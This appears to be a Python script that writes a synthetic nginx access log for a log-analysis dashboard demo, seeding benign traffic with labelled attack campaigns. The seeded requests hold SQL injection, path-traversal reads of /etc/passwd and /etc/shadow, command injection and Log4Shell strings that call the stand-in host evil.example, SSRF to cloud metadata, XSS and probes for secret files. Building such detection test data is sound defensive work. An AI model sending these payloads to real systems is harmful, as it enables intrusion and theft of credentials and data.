#!/usr/bin/env python3
"""Generate a realistic nginx combined access log with seeded attack traffic.

Usage:
    python3 scripts/gen_demo_log.py [--lines 600000] [--out demo/access-demo.log]

The generated file mixes benign browser traffic with SQLi, path traversal/LFI,
command injection, Log4Shell, webshell probes, XSS, SSRF, a Nikto-style
vulnerability scan, and a password brute-force burst, all from distinct source
IPs so the dashboard has something interesting to rank.
"""

from __future__ import annotations

import argparse
import random
from datetime import datetime, timedelta, timezone

TZ = timezone(timedelta(hours=-7))
START = datetime(2026, 11, 12, 2, 0, 0, tzinfo=TZ)

LEGIT_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
    "curl/8.7.1",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
]

LEGIT_PATHS = [
    ("/", 200),
    ("/index.html", 200),
    ("/assets/css/site.css", 200),
    ("/assets/js/app.js", 200),
    ("/assets/js/vendor.js", 200),
    ("/images/logo.png", 200),
    ("/images/hero.webp", 200),
    ("/fonts/inter.woff2", 200),
    ("/api/products", 200),
    ("/api/cart", 200),
    ("/api/recommendations", 200),
    ("/product/42", 200),
    ("/product/108", 200),
    ("/checkout", 200),
    ("/account/orders", 200),
    ("/blog/2026-10-release-notes", 200),
    ("/robots.txt", 200),
    ("/sitemap.xml", 200),
    ("/favicon.ico", 200),
    ("/old-promo", 404),
    ("/images/missing-banner.png", 404),
]

LEGIT_REFS = ["-", "https://shop.example.com/", "https://shop.example.com/product/42", "https://www.google.com/"]


def ip_from_pool(rng: random.Random) -> str:
    prefixes = ["24.114", "66.249", "72.14", "98.42", "108.162", "174.31", "184.105", "209.58"]
    return f"{rng.choice(prefixes)}.{rng.randint(0, 255)}.{rng.randint(1, 254)}"


def fmt_ts(dt: datetime) -> str:
    return dt.strftime("%d/%b/%Y:%H:%M:%S %z")


def nginx_line(ip: str, dt: datetime, method: str, path: str, status: int,
               size: int, ref: str, ua: str, user: str = "-") -> str:
    return (
        f'{ip} - {user} [{fmt_ts(dt)}] "{method} {path} HTTP/1.1" {status} '
        f'{size} "{ref}" "{ua}"'
    )


def build_attacks(rng: random.Random) -> list[tuple[datetime, str]]:
    """Return (timestamp, line) tuples for every attack campaign."""
    attacks: list[tuple[datetime, str]] = []
    base = START + timedelta(minutes=25)

    def add(ip: str, offset_s: float, method: str, path: str, status: int,
            ua: str, ref: str = "-", size: int = 0) -> None:
        attacks.append((base + timedelta(seconds=offset_s),
                        nginx_line(ip, base + timedelta(seconds=offset_s), method, path, status, size, ref, ua)))

    # --- SQL injection: 45.13.2.9 -------------------------------------------------
    sqli_ua = "sqlmap/1.8.7#stable (https://sqlmap.org)"
    sqli_paths = [
        ("/product?id=1%20UNION%20SELECT%20username,password%20FROM%20users", 200),
        ("/product?id=1%27%20OR%20%271%27=%271", 200),
        ("/product?id=1%20AND%20SLEEP(5)", 504),
        ("/search?q=1%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--", 500),
        ("/search?q=test%27%20UNION%20ALL%20SELECT%20NULL,NULL,version()--", 200),
        ("/api/products?sort=price%3B%20DROP%20TABLE%20products--", 500),
        ("/product?id=1%20AND%20extractvalue(1,concat(0x7e,version()))", 500),
        ("/login", 200),
    ]
    for i, (path, status) in enumerate(sqli_paths):
        add("45.13.2.9", i * 7.0, "GET" if i % 3 else "POST", path, status, sqli_ua)
    add("45.13.2.9", 61, "POST", "/login", 302, sqli_ua, size=0)
    for i in range(3):
        add("45.13.2.9", 70 + i, "GET", "/product?id=1%27%20OR%20%271%27=%271", 200, sqli_ua)

    # --- Path traversal + LFI: 185.220.101.7 --------------------------------------
    trav_ua = "Mozilla/5.0 (compatible; Nmap Scripting Engine)"
    trav_paths = [
        "/../../../../etc/passwd",
        "/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "/%252e%252e%252f%252e%252e%252fetc%252fpasswd",
        "/download?file=../../../etc/shadow",
        "/download?file=..%2f..%2f..%2fetc%2fpasswd",
        "/?page=php://filter/convert.base64-encode/resource=index",
        "/?page=../../../../proc/self/environ",
        "/wp-config.php.bak",
        "/.git/config",
    ]
    for i, path in enumerate(trav_paths):
        add("185.220.101.7", 180 + i * 4.5, "GET", path, 403 if i % 2 else 404, trav_ua)

    # --- Command injection + Log4Shell: 91.240.118.22 -----------------------------
    cmdi_ua = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36"
    cmdi_paths = [
        "/api/ping?host=127.0.0.1%3Bcat%20/etc/passwd",
        "/cgi-bin/test.sh?cmd=id",
        "/index.php?cmd=%3Bwget%20http://evil.example/x.sh",
        "/api/convert?file=test.pdf%7C%7Ccurl%20http://evil.example",
        "/?x=${jndi:ldap://evil.example/a}",
        "/?x=%24%7bjndi:rmi://evil.example/b%7d",
        "/search?q=$(curl%20http://evil.example/s)",
        "/api/debug?exec=whoami",
    ]
    for i, path in enumerate(cmdi_paths):
        add("91.240.118.22", 300 + i * 3.5, "GET", path, 500 if i < 4 else 404, cmdi_ua)

    # --- Nikto-style vulnerability scan: 198.51.100.66 ----------------------------
    nikto_ua = "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000001)"
    scan_paths = [
        "/.env", "/.env.backup", "/.git/HEAD", "/.git/config", "/.svn/entries",
        "/wp-config.php", "/wp-login.php", "/wp-admin/", "/xmlrpc.php",
        "/phpmyadmin/", "/adminer.php", "/server-status", "/server-info",
        "/actuator/env", "/actuator/health", "/swagger-ui/index.html",
        "/v2/api-docs", "/graphql", "/console", "/jmx-console/",
        "/manager/html", "/host-manager/html", "/cgi-bin/", "/jenkins/",
        "/solr/admin/", "/backup.zip", "/db.sql", "/dump.sql",
        "/.aws/credentials", "/.ssh/id_rsa", "/.DS_Store", "/web.config",
        "/WEB-INF/web.xml", "/phpinfo.php", "/info.php", "/test.php",
        "/admin/", "/administrator/", "/login", "/api/v1/users",
    ]
    for i in range(120):
        path = scan_paths[i % len(scan_paths)]
        add("198.51.100.66", 420 + i * 1.6, "GET", path, 404 if i % 9 else 200, nikto_ua)

    # --- Password brute force: 203.0.113.77 ---------------------------------------
    bf_ua = "python-requests/2.31.0"
    for i in range(45):
        add("203.0.113.77", 620 + i * 2.0, "POST", "/login", 401, bf_ua, size=59)
    add("203.0.113.77", 715, "POST", "/login", 302, bf_ua, size=0)

    # --- XSS probes: 192.0.2.44 ---------------------------------------------------
    xss_ua = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
    xss_paths = [
        "/search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E",
        "/product?name=%3Csvg%20onload=alert(1)%3E",
        "/comment?text=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E",
        "/profile?bio=javascript:alert(document.domain)",
        "/?redirect=javascript:alert(1)",
    ]
    for i, path in enumerate(xss_paths):
        add("192.0.2.44", 760 + i * 6, "GET", path, 200, xss_ua)

    # --- SSRF probes: 198.51.100.90 ----------------------------------------------
    ssrf_ua = "Go-http-client/1.1"
    ssrf_paths = [
        "/api/fetch?url=http://169.254.169.254/latest/meta-data/",
        "/proxy?target=http://127.0.0.1:8080/admin",
        "/webhook?callback=http://metadata.google.internal/computeMetadata/v1/",
        "/image?src=file:///etc/passwd",
        "/redirect?next=//localhost/actuator/env",
    ]
    for i, path in enumerate(ssrf_paths):
        add("198.51.100.90", 800 + i * 5, "GET", path, 403, ssrf_ua)

    # --- Webshell probing: 203.0.113.5 -------------------------------------------
    shell_ua = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
    shell_paths = [
        "/shell.php?cmd=id", "/cmd.php?exec=whoami", "/upload.php?cmd=ls",
        "/c99.php", "/r57.php", "/wso.php", "/b374k.php", "/xmlrpc.php?cmd=id",
    ]
    for i, path in enumerate(shell_paths):
        add("203.0.113.5", 840 + i * 4, "GET", path, 404, shell_ua)

    # --- Method probing: 198.51.100.111 ------------------------------------------
    add("198.51.100.111", 900, "TRACE", "/", 405, "curl/8.7.1")
    add("198.51.100.111", 902, "PROPFIND", "/", 405, "curl/8.7.1")
    add("198.51.100.111", 904, "CONNECT", "/", 405, "curl/8.7.1")

    return attacks


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--lines", type=int, default=600_000)
    parser.add_argument("--out", default="demo/access-demo.log")
    args = parser.parse_args()

    rng = random.Random(1337)
    attacks = build_attacks(rng)

    benign: list[tuple[datetime, str]] = []
    session_ips = [ip_from_pool(rng) for _ in range(420)]
    for i in range(args.lines):
        dt = START + timedelta(seconds=i * 0.01)
        ip = rng.choice(session_ips)
        path, status = rng.choices(LEGIT_PATHS, weights=[20, 40, 14, 18, 12, 16, 10, 6, 8, 9, 7, 8, 6, 5, 4, 3, 1, 1, 6, 2, 1])[0]
        if status == 404 and rng.random() < 0.9:
            path, status = "/", 200
        size = 0 if status == 304 else rng.randint(180, 48_000)
        benign.append((dt, nginx_line(ip, dt, rng.choice(["GET", "GET", "GET", "POST"]),
                                      path, status, size, rng.choice(LEGIT_REFS),
                                      rng.choice(LEGIT_UAS), "-")))

    everything = benign + attacks
    everything.sort(key=lambda item: item[0])

    # A few deliberately malformed lines, scattered through the file.
    malformed = [
        "garbage line that is not a log entry",
        '10.0.0.5 - - [12/Nov/2026:02:31:00 -0700] "GET /broken HTTP/1.1 200 12 "-" "-"',
        'not-an-ip - - [12/Nov/2026:02:32:00 -0700] "GET / HTTP/1.1" 200 1 "-" "-"',
    ]
    out_path = args.out
    import os
    os.makedirs(os.path.dirname(out_path) or ".", exist_ok=True)
    with open(out_path, "w", encoding="utf-8") as handle:
        for index, (_, line) in enumerate(everything):
            handle.write(line)
            handle.write("\n")
            if index in (7_000, 220_000, 410_000):
                handle.write(malformed.pop(0))
                handle.write("\n")
        for line in malformed:
            handle.write(line)
            handle.write("\n")

    total = len(everything) + 3
    print(f"wrote {out_path}: {total} lines ({os.path.getsize(out_path) / 1_048_576:.1f} MiB), "
          f"{len(attacks)} hostile requests, {args.lines} benign requests")


if __name__ == "__main__":
    main()
